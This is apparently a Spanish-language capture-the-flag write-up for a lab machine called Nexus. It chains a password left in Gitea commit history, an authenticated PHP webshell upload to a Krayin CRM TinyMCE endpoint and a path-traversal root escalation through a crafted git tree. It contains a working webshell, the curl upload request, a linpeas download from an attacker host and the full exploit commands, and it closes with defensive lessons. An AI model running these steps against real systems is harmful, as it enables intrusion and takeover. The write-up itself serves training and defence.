Tres vhosts bajo `nexus.htb` — la página de marketing principal que filtra el correo de un hiring manager en el código fuente HTML, una instancia de Gitea en `git.nexus.htb` cuyo último commit *eliminó* una `DB_PASSWORD` del `.env` (pero el historial de git la conserva), y un panel de administración de Krayin CRM en `billing.nexus.htb`. La contraseña filtrada autentica el correo descubierto contra Krayin v2.2.0, vulnerable a **CVE-2026-38526** — subida arbitraria de archivos autenticada vía `/admin/tinymce/upload` sin validación de MIME ni de extensión — lo que da una webshell PHP y una reverse shell como `www-data`. El `.env` de Krayin expone una segunda contraseña de base de datos reutilizada como contraseña del sistema para el usuario `jones`. La escalada de privilegios se realiza mediante un timer de systemd `gitea-template-sync` que ejecuta un script de Python personalizado como root, que itera los repositorios plantilla de Gitea y escribe el blob de cada archivo versionado en `os.path.join(STAGING_DIR, owner, name, filepath)` sin ninguna validación de ruta; construir un repositorio plantilla cuyo árbol de git contiene una entrada llamada `../../../../../root/.ssh/authorized_keys` hace que el timer instale una clave SSH controlada por el atacante en el authorized_keys de root.

### `git.nexus.htb` — filtración de credencial en el historial de git de Gitea

El subdominio git servía una instancia de **Gitea** con la navegación anónima de repositorios habilitada. El usuario `admin` tenía un único repositorio público, `krayin-docker-setup`, que contenía lo que parecía ser infraestructura como código para el despliegue de Krayin CRM que alimenta el subdominio de billing.

El `HEAD` actual del repositorio estaba limpio — el `.env` solo contenía valores de marcador de posición. Lo que resultó importar fue el **historial de commits**. El diff del último commit:

```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf.diff
diff --git a/.env b/.env
@@ -3,7 +3,7 @@
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

El diff es toda la intrusión en tres líneas. Un operador en algún momento commiteó una contraseña de base de datos real en el `.env`, se dio cuenta del error y *la eliminó en un commit posterior* — sin reescribir el historial. El almacenamiento direccionable por contenido de git significa que, aunque la contraseña ya no esté en el árbol de trabajo, permanece en cada clon del repositorio como parte del objeto de commit histórico que la introdujo. El hecho de que el commit `9b817fa4` sea navegable públicamente, y que el diff muestre explícitamente el valor *antiguo*, entrega la credencial sin necesidad de crackeo alguno.

Este es uno de los mecanismos de filtración de credenciales más comunes del mundo real — los operadores rutinariamente commitean secretos, lo notan rápido y los "eliminan" con un commit de seguimiento, sin entender que el historial de git es la verdadera capa de almacenamiento. La remediación correcta requiere reescribir el historial (`git filter-branch` o `git filter-repo`), hacer force-push y rotar la credencial — lo que casi nunca ocurre.

## Explotación — CVE-2026-38526 (RCE por subida en el TinyMCE de Krayin)

### Entendiendo la vulnerabilidad

Krayin CRM es un CRM basado en Laravel que integra el editor de texto enriquecido **TinyMCE** para componer notas y correos. TinyMCE admite la subida de imágenes en línea — cuando el usuario arrastra una imagen al editor, se envía una petición POST a un endpoint de subida definido por la aplicación y la URL devuelta se incrusta en el documento. La convención es que el endpoint valide la subida (debería ser una imagen) y devuelva la URL pública.

En Krayin 2.2.x, el endpoint en `POST /admin/tinymce/upload`:

1. Requiere autenticación (cualquier sesión de admin logueada).
2. Requiere el token CSRF estándar de Laravel.
3. **No valida el tipo MIME, la extensión ni los magic bytes del archivo.** Acepta lo que sea que se suba, lo almacena en `/storage/tinymce/` bajo un nombre UUID aleatorio y **conserva la extensión original**.
4. El directorio de almacenamiento se sirve públicamente y es procesado por PHP a través de la cadena nginx + php-fpm.

Compuestos, estos tres fallos significan que cualquier admin autenticado puede subir un archivo arbitrario con cualquier extensión a una ruta que el servidor web ejecutará. Un archivo `.php` con código PHP aterriza como una URL ejecutable en el servidor. La pista `type=image/png` en el payload multipart satisface la expectativa del editor; el contenido real es lo que el atacante quiera.

### Preparando la subida

La webshell es mínima:

```bash
cat shell.php
<?php system($_GET['cmd']); ?>
```

Dos valores necesarios para la petición. El token CSRF se renderiza en cada página de admin como un input oculto llamado `_token` — legible desde la consola del navegador estando logueado:

```javascript
document.querySelector('input[name="_token"]').value
'Go6Fin7jtmDdKWc5rI0J9mlRQmJSKM8SknI2NObU'
```

Y la cookie de sesión desde la pestaña de almacenamiento del navegador:

```text
krayin_crm_session=eyJpdiI6IitlYU9BaDcrK2ZSanlFVTROU1BDSEE9PSIsInZhbHVlIjoiU...
```

Con ambos, la petición de subida:

```bash
curl -X POST 'http://billing.nexus.htb/admin/tinymce/upload' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -b 'krayin_crm_session=eyJpdiI6IitlYU9BaDcrK2ZSanlFVTROU1BDSEE9PSIsInZ...' \
  -F '_token=Go6Fin7jtmDdKWc5rI0J9mlRQmJSKM8SknI2NObU' \
  -F 'file=@shell.php;type=image/png'
{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/3bcc951cf3f641f69a06e960c026f2a8.php"}
```

La respuesta es la URL servida públicamente de la webshell. La etiqueta MIME `image/png` en el sobre multipart es una mentira que el servidor acepta sin condiciones, y la extensión `.php` sobrevive al renombrado aleatorio.

## Escalada de privilegios — `jones` → `root` (path traversal en el template-sync de Gitea)

### Descubriendo el timer

La enumeración estándar como `jones` no dio nada en los sospechosos habituales — `sudo -l` vacío, sin anomalías SUID, sin archivos cron escribibles evidentes. El avance llegó de un barrido completo de linpeas:

```bash
# En la máquina atacante:
python3 -m http.server 8000

# En el objetivo:
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
bash /tmp/linpeas.sh | tee /tmp/linpeas.out
```

Entre los timers de systemd activos, uno destacaba:

```text
╔══════════╣ System timers
NEXT                       LEFT    UNIT                          ACTIVATES
Mon 2026-06-29 16:56:30    28s     gitea-template-sync.timer     gitea-template-sync.service
```

Un timer personalizado que se dispara cada minuto, activando un servicio que toma su nombre de la instancia de Gitea que corre en el otro vhost. Inspeccionando los archivos de unidad:

```bash
systemctl cat gitea-template-sync.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service
```

```bash
systemctl cat gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

El servicio se ejecuta como **root** e invoca un script de Python personalizado en `/etc/gitea/template-sync.py`. Cualquier comportamiento controlable por el atacante dentro de ese script es una primitiva directa hacia root.

### Analizando el script vulnerable

El propósito del script es sincronizar los "repositorios plantilla" de Gitea en un directorio de staging local — una comodidad para operadores que quieren tener los repos marcados como plantilla materializados en disco. El extracto relevante:

```python
GITEA_URL   = "http://localhost:3000"
REPO_ROOT   = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name  = repo_info['name'].lower()
    bare_path  = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    # Lista todos los blobs del HEAD del bare repo
    result = subprocess.run(
        ['git', 'ls-tree', '-r', 'HEAD'],
        cwd=bare_path,
        capture_output=True, text=True
    )

    # Itera cada entrada (mode, type, hash, path) y materializa el contenido
    for line in result.stdout.strip().split('\n'):
        meta, filepath = line.split('\t', 1)
        objhash = meta.split()[2]

        # CRITICAL: filepath comes verbatim from the git tree object — no validation
        target = os.path.join(stage_path, filepath)

        result = subprocess.run(
            ['git', 'cat-file', 'blob', objhash],
            cwd=bare_path,
            capture_output=True
        )
        with open(target, 'wb') as f:
            f.write(result.stdout)
```

Dos fallos distintos se combinan en la primitiva explotable:

**Fallo 1 — `os.path.join` no bloquea el traversal.** El `os.path.join('/staging/jones/rce', '../../../../../root/.ssh/authorized_keys')` de Python devuelve la cadena literal `/staging/jones/rce/../../../../../root/.ssh/authorized_keys`. No normaliza la ruta. El traversal solo se resuelve cuando finalmente se llama a `open()` y el SO canonicaliza los componentes, momento en el que ya es demasiado tarde para que la aplicación intervenga. Este es uno de los errores de manejo de rutas más repetidos en código Python — la primitiva segura es `os.path.realpath()` seguido de una comprobación explícita de prefijo, o `pathlib.Path.resolve()` con `is_relative_to()`.

**Fallo 2 — las rutas del árbol de git están controladas por el atacante por diseño.** El script confía en que `git ls-tree -r HEAD` devuelva rutas que se mantengan dentro del repo. Pero los objetos árbol de git son simplemente listas de tuplas `(mode, type, hash, name)`, y el campo `name` es una cadena de bytes arbitraria. Los comandos porcelain de alto nivel de git (`git add`, `git mv`) se niegan a versionar archivos cuyos nombres contengan `..` o `/`, pero los comandos plumbing de git — `git update-index --cacheinfo`, `git mktree`, construcción de objetos en crudo — aceptan cualquier nombre. Un repositorio pusheado con un objeto árbol construido maliciosamente reportará la ruta que el atacante haya elegido cuando se ejecute `git ls-tree` contra el bare repo.

El tercer factor reforzante: el script solo procesa repositorios con `template: true`, que es un atributo que cualquier usuario de Gitea puede establecer en su propio repositorio mediante un PATCH a la API de ajustes del repo. No hay una lista blanca de qué usuarios pueden tener repositorios plantilla sincronizados — cualquier usuario de la instancia de Gitea, incluido `jones`, puede tener sus repos plantilla incorporados a la sincronización.

La profundidad `../../../../../` (cinco niveles) se calcula desde el directorio de staging:

```text
/home/git/template-staging/<owner>/<name>/<malicious_filepath>
 ↑                                       ↑
 5 components deep                       traversal starts here
```

Cinco componentes por encima de `<malicious_filepath>` está la raíz del sistema de archivos; añadir `root/.ssh/authorized_keys` aterriza en `/root/.ssh/authorized_keys`.

### Construyendo el repositorio plantilla malicioso

La explotación tiene cinco pasos discretos. Todos se ejecutaron desde la sesión SSH de `jones`.

**Paso 1 — generar un par de claves SSH que el atacante controla:**

```bash
ssh-keygen -t ed25519 -f /tmp/malicious_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/malicious_key
Your public key has been saved in /tmp/malicious_key.pub

cat /tmp/malicious_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC32yZXq3jqAq1H7OMDaZC6AybsfEjVWibtaB2/7OQ0R jones@nexus
```

**Paso 2 — emitir un token de la API de Gitea para `jones`** (el script sincroniza cualquier plantilla que exista; solo necesitamos poder hacer push):

```bash
curl -s -X POST http://localhost:3000/api/v1/users/jones/tokens \
     -H "Content-Type: application/json" \
     -u 'jones:y27xb3ha!!74GbR' \
     -d '{"name":"exploit","scopes":["write:repository"]}'
{"id": 2, "name": "exploit", "sha1": "35f78ffe03719548d26616b0a0bd2b30b5175f45", [...]}
TOKEN="35f78ffe03719548d26616b0a0bd2b30b5175f45"
```

**Paso 3 — crear un repositorio en Gitea y marcarlo como plantilla** (dos llamadas a la API; el flag de plantilla debe ponerse después de crearlo):

```bash
curl -s -X POST http://localhost:3000/api/v1/user/repos \
     -H "Authorization: token $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"rce","private":false,"auto_init":true}'

curl -s -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
     -H "Authorization: token $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"template":true}'
{"template": true, [...]}
```

**Paso 4 — construir un clon local con un árbol malicioso.** La forma más limpia de inyectar una entrada de path traversal en un árbol de git es vía `git update-index --add --cacheinfo`, que opera directamente sobre el index y acepta cadenas de ruta arbitrarias:

```bash
git clone http://jones:$TOKEN@localhost:3000/jones/rce.git
cd rce

# Hash the SSH public key as a blob into the repository's object store
KEY_BLOB=$(git hash-object -w /tmp/malicious_key.pub)
echo "Blob hash: $KEY_BLOB"

# Add the blob to the index under a path with five levels of traversal
git update-index --add --cacheinfo \
    100644,$KEY_BLOB,../../../../../root/.ssh/authorized_keys

# Commit the index as-is (git write-tree + git commit-tree, wrapped by commit)
git -c user.email=j@x -c user.name=j commit -m "rce"
git push origin main
```

El push tiene éxito porque Gitea — como cualquier servidor git conforme — simplemente acepta el pack file y almacena los objetos verbatim. La validación de rutas que habría detectado `..` solo se aplica en `git add` del lado del cliente, que `update-index --cacheinfo` evita.

**Paso 5 — esperar al timer.** El timer se dispara una vez por minuto. Observando el log:

```bash
tail -f /var/log/template-sync.log
[2026-06-29 17:09:07] Template sync starting
[2026-06-29 17:09:07] Found 1 template repo(s)
[2026-06-29 17:09:07] Syncing template: jones/rce
[2026-06-29 17:09:08]   synced: README.md
[2026-06-29 17:09:08]   synced: ../../../../../root/.ssh/authorized_keys
[2026-06-29 17:09:08] Template sync complete
```

La entrada del log confirma que el `open()` con path traversal tuvo éxito. El proceso de Python — ejecutándose como root — acaba de escribir la clave pública del blob malicioso en `/root/.ssh/authorized_keys`. La clave privada correspondiente vive en `/tmp/malicious_key`, así que el login estándar por clave SSH como root funciona:

```bash
ssh -i /tmp/malicious_key -o StrictHostKeyChecking=no root@10.129.234.54
Welcome to Ubuntu 24.04.4 LTS
root@nexus:~# whoami
root
root@nexus:~# cat /root/root.txt
```

La clave depositada da una sesión root fresca y estable — independiente de la sesión SSH de `jones` y libre de las restricciones que vienen con una shell lanzada por sudo.

## Conclusiones clave

- **Eliminar una credencial de un archivo no la elimina del historial de git.** Cada objeto de commit de un repositorio git preserva el diff completo de los cambios que lo introdujeron. Un cambio `DB_PASSWORD=xxx → DB_PASSWORD=` reescribe el árbol de trabajo pero deja el secreto incrustado en el objeto de commit que lo añadió originalmente, accesible para cualquiera con permiso de lectura sobre el repositorio. La única respuesta correcta ante un secreto commiteado es reescribir el historial (`git filter-repo`), hacer force-push *y rotar la credencial* — el tercer paso importa porque los clones anteriores a la reescritura siguen conteniendo el secreto. Hay que asumir que las instancias públicas de Gitea/GitLab/GitHub han filtrado secretos en su historial; herramientas como `trufflehog`, `gitleaks` y `git-secrets` deberían estar en el CI/CD de todo defensor.
- **Las direcciones de correo en el código fuente HTML son activos de reconocimiento, no datos de contacto.** Un `<a href="mailto:...">` en una página de marketing es un nombre de usuario candidato para cada formulario de login de cada vhost adyacente. El `j.matthew@nexus.htb` de la página principal de Nexus, combinado con la contraseña recuperada del historial de git, fue una autenticación de coincidencia exacta en el login de admin de Krayin — el pivote de la intrusión.
- **Los endpoints de subida de TinyMCE en CRMs de Laravel son la primitiva canónica de RCE autenticado.** La integración de subida de imágenes de TinyMCE se implementa convencionalmente como un endpoint del tipo "confía en el editor" que acepta lo que sea que mande el navegador. Los CRMs y CMSs que lo conectan sin validación explícita de MIME y extensión aterrizan rutinariamente en los feeds de CVE: Krayin (2026-38526), Bagisto y varios forks más pequeños de Laravel han publicado advisories con esencialmente la misma causa raíz. La checklist del defensor en cualquier integración de TinyMCE es: aplicar una lista blanca de extensiones del lado del servidor, validar los magic bytes (no la cabecera `Content-Type` — el navegador envía lo que diga el cliente), almacenar las subidas fuera de la ruta servida por PHP y servirlas a través de un proxy autenticado.
- **Los archivos `.env` son el volcado universal de credenciales de Laravel.** Todo despliegue de Laravel tiene uno; rutinariamente contiene la contraseña de la base de datos, la clave de cifrado de la aplicación (que firma/verifica sesiones y colas), credenciales de correo, claves de API de terceros y, con frecuencia, credenciales de AWS/cloud. Cualquier primitiva de ejecución de código contra una aplicación Laravel las filtra todas de inmediato vía `cat .env` en la raíz del proyecto. La mitigación del defensor es cargar los secretos desde un vault en runtime en lugar de desde un archivo — pero hasta que eso ocurra, las web shells contra Laravel llevan la exposición de credenciales incluida de serie.
- **El `os.path.join` de Python no es seguro frente a path traversal.** Este es uno de los errores más repetidos en código Python que maneja rutas influidas por el usuario: los desarrolladores asumen que `os.path.join` valida el resultado, cuando en realidad solo concatena con `/`. Patrón seguro: resolver la ruta unida con `os.path.realpath` (o `pathlib.Path.resolve()`) y luego verificar que empieza por el prefijo previsto antes de abrirla. La clase de bug es idéntica en lenguaje tras lenguaje — `path.join` de Node.js, `File.join` de Ruby y `filepath.Join` de Go se comportan igual.
- **La validación de rutas del árbol de git vive en `git add`, no en el formato.** Los comandos porcelain de alto nivel de git se niegan a versionar archivos cuyos nombres contengan `..` o `/`, lo que adormece a los desarrolladores hasta hacerles confiar en las rutas que devuelve `git ls-tree`. Pero los objetos árbol pueden contener cadenas de ruta arbitrarias — `git update-index --cacheinfo`, `git mktree` o los árboles binarios construidos directamente evitan todos las comprobaciones del porcelain. Cualquier código que consuma rutas de árboles de git y las use en operaciones de sistema de archivos debe validarlas, no confiar en que git ya lo haya hecho.
- **Los timers de systemd que ejecutan scripts como root cada minuto son un objetivo atractivo.** El `gitea-template-sync.timer` existe porque alguien quería sincronización automática; la cadencia rápida existe porque querían una funcionalidad reactiva. Ambas decisiones, defendibles por separado, se combinan en un bucle de feedback de 60 segundos para los atacantes — lo bastante corto como para que el desarrollo del exploit sea interactivo, lo bastante frecuente como para que el atacante no tenga que esperar a la siguiente oportunidad. Hay que ralentizar el timer, o reescribir el script para soltar privilegios antes de procesar datos controlados por el usuario.
- **El bug de privesc es un problema de confianza en datos de terceros, no un bug de Gitea.** Gitea hace exactamente lo que está documentado que hace — almacena cualquier objeto que los clientes le pusheen y lo sirve de vuelta cuando se le pide. El script de Python personalizado es el que falla al validar, pero la lección de fondo es más amplia: cualquier integración que procese datos producidos por *usuarios de un sistema distinto* (aquí, usuarios de Gitea) debe tratarlos con la misma sospecha que la entrada directa del usuario. Los datos de un sistema interno no están pre-saneados; simplemente heredan las suposiciones de confianza del sistema que los produjo, que en el caso de Gitea es "cualquiera que pueda autenticarse".
